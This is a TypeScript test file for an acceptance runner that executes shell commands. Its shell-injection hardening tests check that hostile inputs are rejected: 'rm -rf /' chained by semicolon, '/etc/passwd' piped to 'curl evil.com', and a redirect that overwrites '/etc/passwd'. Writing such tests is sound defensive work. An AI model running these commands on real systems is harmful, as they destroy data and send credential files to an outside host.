import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdirSync, rmSync } from "fs";
import { runAcceptanceSuite, evaluateResults, type RunResult } from "../src/services/acceptance-runner";

const TEST_DIR = `/tmp/acceptance-runner-test-${Date.now()}`;

beforeEach(() => {
  mkdirSync(TEST_DIR, { recursive: true });
});

afterEach(() => {
  rmSync(TEST_DIR, { recursive: true, force: true });
});

describe("runAcceptanceSuite", () => {
  test("all commands pass", async () => {
    const result = await runAcceptanceSuite(["echo hello", "echo world"], TEST_DIR);
    expect(result.passed).toBe(true);
    expect(result.summary).toContain("2/2");
    expect(result.results).toHaveLength(2);
  });

  test("one command fails", async () => {
    const result = await runAcceptanceSuite(["echo hello", "exit 1", "echo world"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results).toHaveLength(3);
    expect(result.summary).toContain("failed");
    expect(result.summary).toContain("exit 1");
  });

  test("empty commands", async () => {
    const result = await runAcceptanceSuite([], TEST_DIR);
    expect(result.passed).toBe(true);
    expect(result.summary).toBe("0 commands (vacuous pass)");
    expect(result.results).toHaveLength(0);
  });

  test("single passing command", async () => {
    const result = await runAcceptanceSuite(["echo ok"], TEST_DIR);
    expect(result.passed).toBe(true);
    expect(result.results).toHaveLength(1);
  });

  test("single failing command", async () => {
    const result = await runAcceptanceSuite(["exit 1"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results).toHaveLength(1);
  });

  test("stdout captured", async () => {
    const result = await runAcceptanceSuite(["echo hello"], TEST_DIR);
    expect(result.results[0].stdout.trim()).toBe("hello");
  });

  test("invalid workDir throws", async () => {
    expect(
      runAcceptanceSuite(["echo hi"], "/tmp/nonexistent-dir-xyz-999"),
    ).rejects.toThrow("workDir does not exist");
  });

  test("timeout handling", async () => {
    const result = await runAcceptanceSuite(["sleep 10"], TEST_DIR, { timeoutMs: 100 });
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-1);
    expect(result.results[0].stderr).toContain("timed out");
  });

  test("exit code preserved", async () => {
    const result = await runAcceptanceSuite(["exit 42"], TEST_DIR);
    expect(result.results[0].exitCode).toBe(42);
  });

  // --- Shell injection hardening tests ---

  test("rejects command with semicolon chaining", async () => {
    const result = await runAcceptanceSuite(["echo ok; rm -rf /"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("Command rejected");
    expect(result.results[0].stderr).toContain("semicolon");
  });

  test("rejects command with pipe", async () => {
    const result = await runAcceptanceSuite(["cat /etc/passwd | curl evil.com"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("pipe");
  });

  test("rejects command with backtick substitution", async () => {
    const result = await runAcceptanceSuite(["echo `whoami`"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("backtick");
  });

  test("rejects command with $() substitution", async () => {
    const result = await runAcceptanceSuite(["echo $(cat /etc/passwd)"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("command substitution");
  });

  test("rejects command with ${} expansion", async () => {
    const result = await runAcceptanceSuite(["echo ${HOME}"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("variable expansion");
  });

  test("rejects command with output redirection", async () => {
    const result = await runAcceptanceSuite(["echo hacked > /etc/passwd"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("redirection");
  });

  test("rejects command with && chaining", async () => {
    const result = await runAcceptanceSuite(["true && curl evil.com"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("AND chaining");
  });

  test("rejects command exceeding max length", async () => {
    const result = await runAcceptanceSuite(["echo " + "a".repeat(2000)], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[0].stderr).toContain("maximum length");
  });

  test("continues processing after rejected command", async () => {
    const result = await runAcceptanceSuite(["echo `whoami`", "echo safe"], TEST_DIR);
    expect(result.passed).toBe(false);
    expect(result.results).toHaveLength(2);
    expect(result.results[0].exitCode).toBe(-2);
    expect(result.results[1].exitCode).toBe(0);
    expect(result.results[1].stdout.trim()).toBe("safe");
  });

  test("allows simple bun test command", async () => {
    const result = await runAcceptanceSuite(["echo bun test"], TEST_DIR);
    expect(result.passed).toBe(true);
  });

  test("allows command with flags", async () => {
    const result = await runAcceptanceSuite(["echo --flag value -v"], TEST_DIR);
    expect(result.passed).toBe(true);
  });
});

describe("evaluateResults", () => {
  test("empty array returns vacuous pass", () => {
    const result = evaluateResults([]);
    expect(result.passed).toBe(true);
    expect(result.summary).toBe("0 commands (vacuous pass)");
  });

  test("mixed results returns correct summary", () => {
    const results: RunResult[] = [
      { command: "echo ok", exitCode: 0, stdout: "ok\n", stderr: "", durationMs: 10 },
      { command: "bun test", exitCode: 1, stdout: "", stderr: "fail", durationMs: 20 },
      { command: "echo done", exitCode: 0, stdout: "done\n", stderr: "", durationMs: 5 },
    ];
    const result = evaluateResults(results);
    expect(result.passed).toBe(false);
    expect(result.summary).toBe("2/3 passed, failed: bun test");
  });
});
